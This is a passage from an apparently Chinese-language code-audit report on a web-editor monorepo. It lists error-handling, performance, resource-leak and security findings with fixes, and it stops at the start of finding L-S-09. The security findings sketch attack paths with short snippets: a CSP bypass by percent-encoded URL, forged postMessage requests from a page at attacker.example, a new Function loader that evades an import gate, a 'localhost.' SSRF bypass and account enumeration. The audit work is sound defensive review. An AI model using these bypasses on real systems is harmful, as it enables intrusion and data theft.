##### L-EH-25 traceStore.append 未加防护,遥测写入失败会把成功结果变异常并掩盖原始错误

- **位置**: [`packages/shared/src/llm/gateway.ts:230`](packages/shared/src/llm/gateway.ts#L230)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-shared-assets

**详情**: 成功路径 230 行与失败路径 272 行均 await this.traceStore?.append(...) 且无 try/catch。LlmTraceStore 是注入端口(traceStore.ts 接口),浏览器侧可实现为 IndexedDB 支撑;append reject 会直接从 createSuccessResult/createFailureResult 抛出,使 run() 整体 reject。

**失败场景**: provider 正常返回结构化输出,但 trace 写 IndexedDB 因配额耗尽失败,run() reject,调用方丢失已到手的生成结果;若发生在 createFailureResult(272 行),append 异常还会替换掉原始 LlmProviderError,诊断码与 rawResponse 一并丢失。

**修复建议**: 将两处 append 包进 try/catch(失败时仅本地降级记录,如 console.warn 或附加 info 级诊断),保证遥测失败永不影响任务结果与错误传播。

##### L-EH-26 sanitizeSvgElement 无限深度递归,512KB 内的深层嵌套 SVG 可触发栈溢出

- **位置**: [`packages/shared/src/safety/svg.ts:211`](packages/shared/src/safety/svg.ts#L211)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-shared-assets

**详情**: sanitizeSvgElement(186-216 行)对每个子元素直接递归(211 行 sanitizeSvgElement(child as Element, document)),无嵌套深度限制;sanitizeSvgMarkup(218-238 行)契约是不可用输入返回 null,但全程不捕获异常。调用方 packages/ui/src/form/imageUploadPreview.ts:43 只做 file.size 大于 MAX_SVG_PREVIEW_BYTES(512KB)检查,无 try/catch。

**失败场景**: 用户上传约 100KB、由 3 万个嵌套 g(每个 3 字节)构成的 SVG,远低于 512KB 限额,DOMParser 正常解析,sanitizeSvgElement 递归深度超出 V8 栈,抛 RangeError: Maximum call stack size exceeded,createImageUploadPreviewUrl reject,上传流程报错而非优雅跳过预览。

**修复建议**: 给 sanitizeSvgElement 增加 depth 参数,超过阈值(如 64/128)返回 null;或改写为显式栈迭代;最低限度在 sanitizeSvgMarkup 内 try/catch 异常后返回 null。

##### L-EH-27 toFixed(precision) 无边界校验,负数 precision 导致渲染崩溃

- **位置**: [`packages/ui/src/data/PdxStatistic.tsx:34`](packages/ui/src/data/PdxStatistic.tsx#L34)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ui-data

**详情**: 第 32-35 行 formattedValue = typeof value === number 且 precision !== undefined 时 value.toFixed(precision) 否则 value。precision 类型为 number,未做 [0, 100] 钳制。Number.prototype.toFixed 在 digits 小于 0 或 大于 100 时抛 RangeError,异常发生在渲染期。

**失败场景**: 消费方由配置/URL 计算 precision(如 precision = decimals - 1 在 decimals=0 时为 -1):PdxStatistic 渲染时抛 RangeError: toFixed() digits argument must be between 0 and 20,整个统计卡片所在 React 子树渲染失败。

**修复建议**: 钳制后再格式化:const digits = Math.min(100, Math.max(0, Math.trunc(precision))); value.toFixed(digits),或 NaN/非法时回退原始 value。

##### L-EH-28 预览 Promise.all 无 catch:单文件读取失败导致预览永久陈旧加未处理拒绝

- **位置**: [`packages/ui/src/form/PdxImageUpload.tsx:56`](packages/ui/src/form/PdxImageUpload.tsx#L56)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ui-form

**详情**: 代码事实成立:PdxImageUpload L56 Promise.all 无 catch,createSvgPreviewUrl 的 await file.text() 可因文件选中后不可读(删除/锁定/网络盘)reject。修正:files 变更时 cleanup(L75)已 revoke 旧 blob URL,故预览区更可能是破图/空白而非旧图;但 previews 与新 files 按 index 错配、删除按钮作用于新 files、unhandled rejection 均属实,且同批已成功的 SVG blob URL 因 then 未执行而泄漏。触发需罕见 IO 失败,影响为 UI 不一致加控制台报错,严重度宜降为 low。

**失败场景**: 用户先选 a.png(预览生成),随后改选一组新文件且其中某 SVG 底层读取失败:预览区继续显示旧图或破图,但文件名标签来自新 files,删除按钮按新 files 的索引工作,所见与所删不一致,且组件无任何错误态反馈。

**修复建议**: 改用 Promise.allSettled 并对失败项降级为 null 占位,或至少 .catch 在 isActive 时 setPreviews([]),保证预览状态与 files 同步收敛。

**验证备注**: 已读 PdxImageUpload.tsx:L56 void Promise.all(...).then(...) 确无 .catch;imageUploadPreview.ts:L43 createSvgPreviewUrl 内 sanitizeSvgMarkup(await file.text()),file.text() 对选中后被删/锁/网络盘文件会 reject(NotReadableError),SVG 默认经 isSvgFileLike 进入该路径。

#### 3.4.4 performance

##### L-P-01 capabilities 端点为返回静态能力列表而加载完整 workspace 快照

- **位置**: [`apps/backend/internal/modules/workspace/handlers_workspace.go:35`](apps/backend/internal/modules/workspace/handlers_workspace.go#L35)
- **类别**: performance ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: be-ws-a

**详情**: HandleGetWorkspaceCapabilities 调用 handler.module.GetSnapshotForUser(...) 仅用于鉴权,随后直接返回静态的 DefaultCapabilities()。GetSnapshotForOwner(store_snapshot.go:262 起)会在 REPEATABLE READ 事务中读取 workspace 行、route manifest、settings 以及全部文档内容,结果整体被丢弃。同文件已有更轻量的鉴权路径:Handler.requireWorkspaceOwner 到 store.VerifyWorkspaceOwner(store_helpers.go:218)只做 SELECT 1 FROM workspaces WHERE id 与 owner_id。

**失败场景**: 前端轮询 GET /api/workspaces/{id}/capabilities 时,每次都会把一个含大量文档/大内容的 workspace 全量读入内存再序列化前丢弃;对体积较大的 workspace,高频轮询会造成持续的数据库与内存开销,且可能挤占 5 秒存储超时预算。

**修复建议**: 改用 VerifyWorkspaceOwner(或等价的轻量存在性/归属查询)完成鉴权后再返回 DefaultCapabilities(),不要加载完整快照。

##### L-P-02 生命周期诊断收集每次触发两遍完整 Semantic Index 全量重建

- **位置**: [`packages/workspace/src/authoring/workspaceCodeArtifactLifecycle.ts:92`](packages/workspace/src/authoring/workspaceCodeArtifactLifecycle.ts#L92)
- **类别**: performance ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ws-core

**详情**: collectWorkspaceCodeArtifactLifecycleDiagnostics 第 67 行先调用 createWorkspaceCodeSlotRegistryFromSnapshot(workspace)——其内部(createWorkspaceCodeSlotRegistryFromSnapshot.ts 第 39-40 行)先整体执行 createWorkspaceSemanticIndexFromSnapshot(解码并校验全部 PIR/Animation/NodeGraph/Token/Data 文档并构建索引),随后再对所有 PIR/graph/animation 文档做第二遍解码注册 provider;第 92 行又调用 projectWorkspaceCodeArtifactLifecycles(workspace),后者(第 43 行)再次从零执行同一条 createWorkspaceCodeSlotRegistryFromSnapshot 到 createWorkspaceSemanticIndexFromSnapshot 全量管线。

**失败场景**: 含上百份文档的工作区中,Issues 面板在每次工作区变更后重新收集诊断,同一份快照上完整文档解码加校验加语义索引构建执行两遍(外加两遍 PIR 文档重复解码),诊断计算耗时翻倍,编辑器在大工作区出现明显卡顿。

**修复建议**: 让 projectWorkspaceCodeArtifactLifecycles 接受已构建的 composition/registry(或让诊断函数复用第 67 行结果直接调用 resolveCodeArtifactLifecycle),避免同一次收集内重复构建语义索引。

##### L-P-03 validateTargetsAndContracts 对每条入边重复解码目标组件文档,未复用 decodedById

- **位置**: [`packages/workspace/src/component/workspaceComponentGraph.ts:437`](packages/workspace/src/component/workspaceComponentGraph.ts#L437)
- **类别**: performance ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ws-component

**详情**: validateWorkspaceComponentGraph 开头 collectDecodedDocuments 已把每个合法 PIR 文档解码加语义校验一次并存入 decodedById(第 106-132 行)。但 validateTargetsAndContracts 遍历每条依赖边时,第 437-439 行又对目标 pir-component 文档整体调用 decodeWorkspacePirDocument(targetWorkspaceDocument, ...)(含 codec 归一化 tryNormalizeWorkspacePirContent 加 validatePirDocument,无任何缓存)。同一 hub 组件被 N 个实例消费即重复解码 N 次。该验证每次创作规划执行两遍(collectIntroducedGraphIssues 的 baseline 加 candidate),每次事务提交再经 validateWorkspaceSnapshot 执行一遍,语义索引重建也调用它。

**失败场景**: 设计系统工作区:1 个含 1000+ 节点的组件文档被 300 个页面实例引用。用户在 Inspector 中每改一个元素(每击键一次 element.update 规划),2 次全图验证乘 300 次对该大文档的重复解码/校验,再叠加提交时 1 次,单次编辑约 900 次大文档全量解码,编辑延迟随实例数乘文档规模线性放大,而本可用 decodedById.get(targetDocumentId) O(1) 命中。

**修复建议**: 在 validateTargetsAndContracts 中改用已有的 decodedById 查找目标文档:命中则直接取 decodedContent.componentContract;未命中(解码/语义非法)再报 targetInvalid。将每条边的 O(文档规模) 解码降为 O(1) 查找,消除 hub 组件场景的重复解码放大。

#### 3.4.5 resource-leak

##### L-RL-01 backpressure 等待 drain 期间 socket 被 destroy 时,扫描帧连同整份资产字节永久泄漏

- **位置**: [`apps/asset-delivery-host/src/clamAvContentScanner.ts:49`](apps/asset-delivery-host/src/clamAvContentScanner.ts#L49)
- **类别**: resource-leak ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: app-hosts

**详情**: writeWithBackpressure 第 48-50 行 if 非 socket.write(contents) await once(socket, drain)。若等待 drain 期间 socket 被销毁(典型路径:第 85-86 行 socket.setTimeout 触发 timeout,fail(timeout),socket.destroy();destroy 不产生 error 事件),node:events 的 once() 只监听 drain 与 error,该 Promise 永不 settle。外层 Promise 已由第 89 行 close 结算,HTTP 侧正常返回 503,但挂起的异步写入帧持续引用本次扫描的完整 contents(上传上限 32MB)与 socket,直到进程退出都不释放。

**失败场景**: clamd 停止读取流(或网络挂起)使 socket.write 返回 false 进入 drain 等待,15 秒空闲超时触发 destroy:本次扫描对外正确返回 scanner-unavailable,但最多 32MB 的 contents 缓冲被永久驻留;在 clamd 反复挂起/重启的故障窗口内,每次超时扫描线性累积驻留内存,最终压垮 Asset Delivery Host。

**修复建议**: 将 drain 等待改为与结束信号竞速,如 await Promise.race([once(socket, drain), once(socket, close).then(抛 BinaryAssetScannerUnavailableError(connection))]),或在 await 前检查并在 destroy 时确保释放对 contents 的引用。

##### L-RL-02 头像更新从不清理旧文件,错误路径遗留孤儿文件

- **位置**: [`apps/backend/internal/modules/auth/handlers.go:276`](apps/backend/internal/modules/auth/handlers.go#L276)
- **类别**: resource-leak ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: be-env-auth

**详情**: HandleUpdateAvatar 每次在 data/uploads/avatars/userID/ 生成新随机文件名(行 270-277 os.OpenFile O_CREATE|O_EXCL),UpdateAvatarURL(行 293)成功后从不删除上一个 avatarURL 指向的旧文件;Sync(行 287)失败或 UpdateAvatarURL 失败时,刚创建的新文件同样未清理(行 282 仅 defer Close)。仓库内也无任何 uploads 清理维护任务,磁盘随更新次数线性增长。

**失败场景**: 用户更新 N 次头像,磁盘保留 N 个图片文件而仅 1 个被引用;写入后 DB 更新失败的请求还会额外遗留无人引用的新文件,data/uploads 无界增长。

**修复建议**: DB 更新成功后 best-effort 删除旧 avatarURL 对应的本地文件;文件创建后任一后续步骤失败时删除新建文件。

##### L-RL-03 compileSnapshot 失败时不 dispose 会话,且失败的 Promise 被永久缓存

- **位置**: [`apps/web/src/editor/codeCompile/workspaceShaderCompileEnvironment.ts:116`](apps/web/src/editor/codeCompile/workspaceShaderCompileEnvironment.ts#L116)
- **类别**: resource-leak ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-editor-core

**详情**: compileSnapshot 先 await Promise.all(configuredArtifacts.map)(94 行),成功后才 for 遍历 sessions 执行 session.dispose()(116 行),没有 try/finally。任一 provider 的 openSession/compile reject 时函数提前退出,已打开的 ShaderCompileSession 全部泄漏(ShaderCompileSession 契约含 dispose())。同时 compileWorkspaceShaders 在 await 之前就把 promise 记入 snapshotPromiseByKey(147-149 行),被 reject 的 Promise 也按该快照 key 固化,同一 revision 下后续调用永远复用这个失败 Promise,无法重试。

**失败场景**: 某语言/目标的编译 provider openSession 瞬时 reject(如 TS/WGSL 引擎初始化失败),该快照已开启的其它会话永不释放(多次失败累积泄漏),且该 workspace 修订版本的着色器编译结果被锁定为失败,直到 workspace 产生新修订才恢复。

**修复建议**: 用 try/finally 保证 sessions 全部 dispose;在 promise reject 时从 snapshotPromiseByKey 删除对应 key(或只缓存成功的 Promise)。

##### L-RL-04 助手面板卸载时不中止在途 LLM 流请求

- **位置**: [`apps/web/src/editor/features/blueprint/editor/assistant/BlueprintAssistantPanel.tsx:356`](apps/web/src/editor/features/blueprint/editor/assistant/BlueprintAssistantPanel.tsx#L356)
- **类别**: resource-leak ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-bp-editor-rest

**详情**: runAssistant 在第356-358行创建 AbortController 并仅在下一次手动运行时调用 abortControllerRef.current?.abort()。组件没有任何 useEffect 清理逻辑:若用户在 gateway.stream(task)(第421行)迭代期间离开蓝图编辑器(组件卸载),activeRequestIdRef.current === requestId 始终成立,for-await 循环继续消费到流结束,对 openai-compatible 提供商即 window.fetch 流(第381-390行)持续接收完整响应,期间对已卸载组件 setState(React 18 下为静默 no-op)。

**失败场景**: 用户点击 Generate 后立即切换到 NodeGraph/Animation 等其他编辑面(慢速模型或弱网下流可能持续数十秒),后台仍持有未取消的 fetch 流与 async 迭代,浪费带宽与连接,且无法被后续运行中止(面板已卸载,ref 丢失)。

**修复建议**: 增加 useEffect 卸载清理 abortControllerRef.current?.abort(),卸载时中止在途请求;或把 AbortController 存于 effect 作用域并在清理函数中 abort。

##### L-RL-05 runPnpm 超时只杀 shell 进程,Windows 下遗留 corepack/pnpm 进程树

- **位置**: [`packages/golden-conformance/src/generatedProjectHarness.ts:154`](packages/golden-conformance/src/generatedProjectHarness.ts#L154)
- **类别**: resource-leak ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-conformance

**详情**: runPnpm 以 shell:true 启动 corepack packageManager args(135-146 行),超时分支(153-158 行)只调用 child.kill():在 Windows 上这仅终止 cmd.exe 包装进程,真正的 corepack/pnpm/node 子进程未被杀,继续运行并持有 mkdtemp 工程目录的文件句柄;随后 verifyGoldenStandaloneProject/verifyGoldenBrowserProject 的 finally 执行 rm(root, recursive true, force true) 时与仍写盘的进程竞争。同文件的 execFileAsync(process.execPath, [entrypoint])完全没有超时参数。

**失败场景**: 独立包门禁中冷缓存 pnpm install 超过 300s:shell 被 kill、测试以超时失败,但真正的 install 进程未被终止,继续在临时目录写文件;CI runner 上累积孤儿 node 进程占用 CPU/网络,且 rm 清理在文件锁下可能失败,导致临时目录残留。

**修复建议**: Windows 上使用 taskkill /T /F(或创建进程树并整体终止)代替 child.kill();为 goldenG2AuthServerMatrix 中的 execFileAsync 传入 timeout 与 killSignal,确保超时时终止实际子进程。

##### L-RL-06 createStyleLease 先注册 cleanup 后登记资源,同步回收路径下 Emotion 样式永久泄漏

- **位置**: [`packages/plugin-mui/src/muiSurfaceHost.tsx:69`](packages/plugin-mui/src/muiSurfaceHost.tsx#L69)
- **类别**: resource-leak ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-plugin-mui-radix

**详情**: createStyleLease 在第 69 行先调用 host.registerCleanup(cleanup),随后第 70-78 行才创建 resource 并 resources.set(styleContainer, resource)。Host 契约允许 registerCleanup 同步执行 cleanup:Web 端 createOfficialSurfaceLeaseRegistry 的 registerReleasedLease(apps/web officialSurfaceHost.tsx 第 82-93、100-102 行)对已 release 的 owner 或 closed 状态会 lease.run() 同步调用 cleanup。此时 disposed=true、cache.sheet.flush() 作用于空表(无操作)、resources.delete 因尚未 set 而无操作。之后第 78 行仍把 resource 写入(可能已孤立的)map,refcount=1,组件继续用该 cache 渲染,Emotion 向全局共享的 OfficialPluginStyleHost 容器插入 style 标签。卸载时 refcount 归零但 flush 被跳过。

**失败场景**: 编辑器 Host 关闭/插件卸载时 releaseOwner/releaseAll drain 完成(或 closed=true)后,一个迟提交的渲染(palette 预览、Suspense 延迟提交或异步重渲)挂载了某个 MUI 包装组件,registerCleanup 同步回收,该组件照常渲染并插入 pdxmui 样式标签,卸载时 flush 被跳过,共享样式容器中每次此类竞态都累积一批死 owner 的 style 标签,CSSOM/DOM 持续增长且无法随插件代际替换回收。

**修复建议**: 先完成资源登记再注册 cleanup(把 resources.set 移到 registerCleanup 之前),或在 registerCleanup 返回后检查 disposed:若已同步回收,则立即再次 flush、不返回可用 lease,保证任何路径下插入的样式都有对应的 flush。

##### L-RL-07 start 后契约校验失败时已启动的 job 被丢弃且不取消

- **位置**: [`packages/runtime-core/src/executionProviderRegistry.ts:122`](packages/runtime-core/src/executionProviderRegistry.ts#L122)
- **类别**: resource-leak ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-core

**详情**: start 先 const job = await provider.start(request),随后对 job.id、job.provider.id/version、job.request !== request 做契约校验,任一失败即抛 ExecutionProviderContractError。此时 provider 已经真正启动了作业(进程/worker/定时器),但 job 对象随异常被丢弃,调用方拿不到引用无法 cancel,注册表也不代为 cancel。

**失败场景**: provider 热升级导致 descriptor.version 与旧 job 声明版本不一致:每次 start 都抛 ContractError,而每次都在远端/worker 中留下一个无人持有的运行中作业,持续占用 runner 资源直到自身超时(若未配置超时则永久泄漏)。

**修复建议**: 在每个契约校验失败分支抛错前调用 await job.cancel(reason provider-contract-violation).catch(undefined),确保已启动作业被回收。

#### 3.4.6 security

##### L-S-01 注册接口以 409 泄露邮箱注册状态,可批量枚举用户

- **位置**: [`apps/backend/internal/modules/auth/handlers.go:116`](apps/backend/internal/modules/auth/handlers.go#L116)
- **类别**: security ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: be-env-auth

**详情**: HandleRegister 对 ErrEmailExists 返回 409 Email already registered(行 115-117),而同模块 HandleLogin 特意做了统一 401 加 dummyPasswordHash 时序对齐(行 149-157)防止账号枚举。注册端点直接暴露注册状态,与模块自身的防枚举设计相矛盾,且该端点无登录限流器保护(loginAttemptLimiter 只作用于 HandleLogin)。

**失败场景**: 攻击者用泄露邮箱清单批量 POST /auth/register,按 409 与 201 区分哪些邮箱已注册,产出活跃账户清单用于定向钓鱼/撞库;因每账号登录限速为 10 次/5 分钟,先枚举再撞库比盲打高效得多。

**修复建议**: 注册改为统一成功语义(如若该邮箱未注册将收到确认),或将注册端点也纳入限流/验证;至少与 login 的防枚举语义保持一致。

**验证备注**: handlers.go:115-117 对 ErrEmailExists(store.go:52-53 唯一约束冲突)返回 409 Email already registered,未注册则 201 并建号,409/201 构成可达枚举 oracle。HandleLogin(149-157)却用 dummyPasswordHash 时序对齐加统一 401 防枚举;loginAttemptLimiter.allow 仅在 HandleLogin:140 调用。

##### L-S-02 非生产环境下任意已登录用户可给自己授予任意 installation 访问权

- **位置**: [`apps/backend/internal/modules/integrations/github/handlers.go:108`](apps/backend/internal/modules/integrations/github/handlers.go#L108)
- **类别**: security ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: be-rest

**详情**: HandleDevEvent 在 environment != production 时,允许已认证用户对请求体 payload.installation.id 调用 handler.store.GrantInstallationAccess(user.ID, payload.Installation.ID)(第106-112行)。installation_id 完全由调用方构造;且 processWebhookPayload 会经 applyInstallationPayload 到 UpsertInstallation 按调用方 payload 落库任意 installation。该 backdoor 仅以环境字符串 production 精确匹配关闭。

**失败场景**: 在 staging/预发布(APP_ENV 非 production 但接入了真实 GitHub App 与多用户)上,任一已登录用户 POST /integrations/github/dev/events,提交他人 installation.id 的 payload,即可给自己建立 active 访问,进而 ListRepositories 并将其绑定到自己项目,绕过 installation 归属模型。

**修复建议**: 将开发后门限制为显式 development(而非非 production),或要求额外的开发态开关/管理员权限;生产判定建议集中到 config 的 IsProduction 语义。

**验证备注**: 代码事实可达:routes.go:20 无条件挂载 dev/events 并仅 RequireAuth;handlers.go:78 以 environment==production 精确匹配关闭(APP_ENV 来自 config.go:203,无枚举约束,staging 不关闭)。line 101 processWebhookPayload 到 applyInstallationPayload 到 UpsertInstallation 按调用方 payload 落 active。

##### L-S-03 安全头查找用原始 route 而文件按解码后路径解析,百分号编码可绕过 CSP

- **位置**: [`apps/plugin-sandbox/scripts/serve.mjs:50`](apps/plugin-sandbox/scripts/serve.mjs#L50)
- **类别**: security ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: app-hosts

**详情**: 第 32 行 decodedRoute = decodeURIComponent(route) 用于第 37 行解析 filePath,但第 50 行 const routeHeaders = headers[route] 或 fallback 用的是未解码的原始 pathname 作为 security-headers.json 的键。于是 GET /%72untime-broker.html 会被解析到 dist/runtime-broker.html 并正常返回,却查不到 /runtime-broker.html 的头策略,退回到不含 Content-Security-Policy 的 fallback 头。即 runtime-broker.html / ui-conformance.html 可在无 script-src hash、无 worker-src 约束的情况下被提供。生产 nginx 配置在 location 匹配前会归一化 URI,故该缺口仅存在于 serve.mjs(dev/preview/verify:deployment 使用)。

**失败场景**: 请求 curl http://127.0.0.1:4174/%72untime-broker.html,返回 runtime-broker.html 内容但响应头无 Content-Security-Policy(仅 Cache-Control/CORP/Referrer-Policy/nosniff),沙箱页失去 script-src hash blob 与 worker-src blob 约束。因页面内容为静态且 script 带 SRI integrity,直接利用面有限,但安全策略执行被旁路。

**修复建议**: 头查找改用解码后的路径(如 headers[decodedRoute],并确保其以 / 开头),或对请求路径做百分号归一化后再同时用于文件解析与头查找,保证同一资源无论 URL 写法都获得同一套安全头。

**验证备注**: 实测复现:serve.mjs 第29行 route 取 URL.pathname(node 验证 /%72untime-broker.html 保持编码),第32行 decodeURIComponent 得 /runtime-broker.html 用于第37行文件解析(文件存在,200),但第50行 headers[route] 用编码键查 security-headers.json(键为解码路径)未命中,回退第51-54行无 CSP 的头。

##### L-S-04 预览桥以通配 targetOrigin * 回传已认证数据/Server Function 响应,且远端桥仅凭 origin null 授信

- **位置**: [`apps/web/src/editor/features/blueprint/editor/runner/BlueprintProjectRunnerSurface.tsx:127`](apps/web/src/editor/features/blueprint/editor/runner/BlueprintProjectRunnerSurface.tsx#L127)
- **类别**: security ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: sweep-security

**详情**: 第 127/162/191 行对预览 iframe 回传 remote-data 与 server-function 执行结果时使用 frameWindow.postMessage(response, *)(通配目标源)。接收侧虽校验 event.source===frameWindow 与 event.origin(blueprintProjectNetworkBridge.ts:55:远端 provider 接受 messageOrigin === null,即任何沙箱不透明源文档),但 iframe sandbox 为 allow-scripts(第 212 行,无 allow-same-origin),帧内自导航不受限制——帧内任何文档(含被重定向加载的第三方页面)源均为 null,同样通过 origin 校验;桥无逐帧握手密钥,响应又用 * 发送,导航后到达的迟到响应会交付给新文档。

**失败场景**: 用户在编辑器中以 remote provider 运行项目预览(已登录)。预览应用代码(被植入恶意外部库适配器/AI 生成代码/XSS)执行 window.location=https://attacker.example/;攻击者页面在沙箱 iframe 内以 origin null 加载并向父窗口 postMessage 构造的 ExecutionServerFunctionBridgeRequest/ExecutionDataGatewayBridgeRequest,编辑器以当前登录用户的执行权限代为调用项目声明的数据操作/Server Function(可含变更类),响应经 postMessage(response,*) 被攻击者监听读取,实现以用户身份执行项目后端变更并外泄响应数据。

**修复建议**: 为每个预览会话生成不可猜测的握手 capability 令牌(随预览引导注入,仅应用运行时就持有),桥消息必须携带该令牌才受理;postMessage 使用预览 URL 的精确 origin 而非 *(远端沙箱可用 event.origin 回填),并在帧导航/重载后使旧令牌与在途请求失效。

##### L-S-05 子目录 .gitattributes 未被保留路径检查拦截,可覆盖根级 LFS 属性规则

- **位置**: [`packages/assets/src/binaryAssetGitProjection.ts:91`](packages/assets/src/binaryAssetGitProjection.ts#L91)
- **类别**: security ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-shared-assets

**详情**: 机制属实且端到端可达:创作侧资产路径 /img/.gitattributes(内容如 * -filter)可经投影进入 files 并以 kind asset 写入暂存。需注意:浏览器 isomorphic-git 流程本身不执行 LFS smudge,覆盖效果发生在下游真实 git 加 git-lfs 克隆该投影仓库时;且根级 .gitattributes 被拦截而子目录漏网属检查不一致。严重度 low 合适,建议按修复项在段级拦截。

**失败场景**: Workspace 创作资产 /img/.gitattributes(内容为 * -filter 或自定义 filter 配置),投影 ready 并提交,img/ 下文件的 filter=lfs diff=lfs merge=lfs 被覆盖,LFS smudge/clean 对这些路径失效,pointer 文本被当普通内容 checkout,或二进制直接写入树,投影仓库的 LFS 语义被创作侧篡改。

**修复建议**: 将保留检查下沉到段级:任一路径段大小写不敏感等于 .gitattributes 即 return undefined 并产出 AST-1204 诊断(与现有 ./.. 段检查同处)。

**验证备注**: normalizeGitPath(89-97行)仅全路径比较 lowerPath 与 .gitattributes 等,段检查(82-87行)只禁空/./..,故 /img/.gitattributes 通过;上游 isCanonicalWorkspaceDocumentPath 同样无 gitattributes 黑名单。下游 apply 循环(224行)仅跳过根 .gitattributes。

##### L-S-06 隔离导入图静态门禁未拦截 eval / new Function,运行期可动态 import Node 内建模块

- **位置**: [`packages/prodivix-compiler/src/executableProject/isolatedServerFunctionImportGraph.ts:208`](packages/prodivix-compiler/src/executableProject/isolatedServerFunctionImportGraph.ts#L208)
- **类别**: security ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-compiler-export

**详情**: 静态门禁确实漏掉 eval/new Function,运行期可达 import(node:...),触发路径真实。但该门禁是确定性投影/纵深防御(326行注释),真正边界是 Worker rootless sandbox(spec 46 line377);持久化另需上传前 single-modified diff 校验与用户显式 Transaction(line360-362)。原场景称绕过 sourceMutationCompleted 即生效属高估,且仅拦标识符也防不住构造器链/process 全局。

**失败场景**: 作者在 Server Function 代码文档中写 export const loadGreeting = async 加 const fs = await new Function(return import node:fs/promises)()。构图审查全部通过(无动态 import/require 节点),项目状态 ready;运行期函数却可读写沙箱内任意文件(如直接向 source-mutation 目录写多个模块文件绕过单次变更围栏),审查者看到的静态导入图与真实行为不符。

**修复建议**: 在 visit() 中额外拦截对标识符 eval 的调用与 new Function / Function(...) 构造(以及 globalThis.eval 形式的成员访问),并在门禁消息中说明隔离目标依赖宿主级沙箱兜底。

**验证备注**: visit()(201-240行)只拦 isImportEqualsDeclaration/ImportTypeNode(203)、ImportKeyword 或 require 的 CallExpression(208-213)、import attributes(219-222),未拦 eval/new Function;transpileModule(294)原样保留。runner 由 node 直跑 invoke.mjs。

##### L-S-07 客户端 SSRF 防护 privateHostname 漏掉尾点形式 localhost.

- **位置**: [`packages/prodivix-compiler/src/react/standaloneDataLiveRuntime.ts:610`](packages/prodivix-compiler/src/react/standaloneDataLiveRuntime.ts#L610)
- **类别**: security ｜ **置信度**: low ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-compiler-react

**详情**: privateHostname 用 normalized === localhost 与 endsWith(.localhost) 判断,但 new URL(http://localhost./).hostname 为 localhost.(带尾点),既不等于 localhost 也不以 .localhost 结尾,直接通过检查;主流解析器会把带尾点的 localhost 解析到回环地址。httpEndpoint/protocolEndpoint 据此放行该主机名。

**失败场景**: client 区 core.http source 的 baseUrl 配置为 http://localhost./(或含尾点的 .local 域 x.local. 同理绕过 endsWith(.local)),导出的独立应用从用户浏览器向回环/本机服务发起请求,绕过本应阻止内网/本机访问的客户端护栏。

**修复建议**: 规范化时去除尾部 .(如 normalized.replace 尾点为空)后再做 localhost/.local/私有网段判断,并对所有文本形态的 IPv4/IPv6 回环表示保持同一归一化。

**验证备注**: privateHostname(607-624) 仅去方括号不去尾点;node v26 实测 new URL(http://localhost./).hostname===localhost.,既不等于 localhost 也不 endsWith(.localhost/.local),IPv4 分支 octets 长度2返回 false,故 httpEndpoint(636行)/protocolEndpoint(819行) 放行,baseUrl(1463/1488)直达浏览器。

##### L-S-08 内存仓库对 worker 租约令牌使用非常量时间比较,与包内既定常量时间约定不一致

- **位置**: [`packages/runtime-remote/src/remoteExecutionControlPlaneMemory.ts:407`](packages/runtime-remote/src/remoteExecutionControlPlaneMemory.ts#L407)
- **类别**: security ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-runtime-remote

**详情**: renewLease/transition/appendWorkerEvent/putArtifact 均以 execution.lease.token !== input.leaseToken 直接比较 bearer 租约令牌(第 387、407、433、501 行)。lease token 是 worker 写入事件/产物/状态迁移的唯一凭证;而同一包的 terminal broker 对同类令牌比较刻意使用常量时间的 remoteExecutionTerminalDigestEqual 加 sha256 摘要(remoteExecutionTerminalBrokerSupport.ts 第 115-124 行),此处偏离了该既定安全约定。JS 字符串 === 的短路比较在理论上泄露令牌前缀匹配长度的时序信号。

**失败场景**: 攻击者若能对该控制平面端点进行高精度时序测量,可逐字节推断有效租约 token;一旦还原,即可在受害 execution 上伪造 appendWorkerEvent/putArtifact/transition(例如注入伪造日志、产物或把状态迁移为 succeeded),绕过 worker 身份边界。实际可利用性受 JS 时序噪声限制,故为低危。

**修复建议**: 与 terminal broker 保持一致:存储/比较 lease token 的 sha256 摘要并复用 remoteExecutionTerminalDigestEqual 进行常量时间比较。

**验证备注**: 实测属实:memory 仓库第387/407/433/501行均以 execution.lease.token !== input.leaseToken 直接比较服务端 createLeaseToken()(controlPlane.ts:586)签发的 bearer 租约令牌;而同包 terminalWorkerBroker.ts:54-57、109-112 对同一令牌刻意用 digestEqual(tokenDigest(...)) 常量时间 sha256 摘要比较。

##### L-S-09 PdxImage 等组件绕过 getDataAttributes 前缀过滤,直接铺开 dataAttributes 可覆盖 src/id 等属性

- **位置**: [`packages/ui/src/image/PdxImage.tsx:48`](packages/ui/src/image/PdxImage.tsx#L48)
